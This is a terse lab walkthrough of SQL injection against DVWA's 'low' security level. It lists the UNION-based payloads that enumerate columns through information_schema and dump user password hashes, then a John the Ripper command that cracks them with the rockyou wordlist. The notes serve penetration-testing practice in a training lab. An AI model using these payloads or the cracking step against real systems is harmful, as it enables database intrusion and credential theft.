# low
- we see a form that takes user input in the form of a "User ID"
- the form takes our input and returns the user's ID, first name, and last name.
- we test for SQLI
-  a single quote character (')
- we see an error
- You'll see something like this when user input isn't correctly sanitized before being used in a server-side SQL query
- we see from the error that the db is mariadb
- Reviewing the MariaDB documentation tells us that the special character % functions as a wildcard
- We'll need to find away to break out of the query the code wants us to make
- ```
  %' or '0'='0
  ```
- start seeing where DVWA keeps the passwords
- ```
  %' or '0'='0' union select * from password #
  ```
- No luck on that specific column, but it does confirm the database name of "dvwa"
- reviewing the MariaDB documentation tells us more useful info. It appears that we can pull all the column names from a MariaDB built-in table called "information_schema.COLUMNS"
- ```
  %' or '0'='0' union select COLUMN_NAME from information_schema.COLUMNS #
  ```
- says the amount of columns we're trying to pull don't equal the amount of columns we're displaying
- we make modifications
- ```
  %' or '0'='0' union select TABLE_NAME, COLUMN_NAME from information_schema.COLUMNS #
  ```
- we see alot of output after alot of modification we got the final payload
- ```
  %' or '0'='0' union select user, password from dvwa.users #
  ```
- now we got the password hashes
- we crack them using john
- ```
  john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-MD5

  ```
  
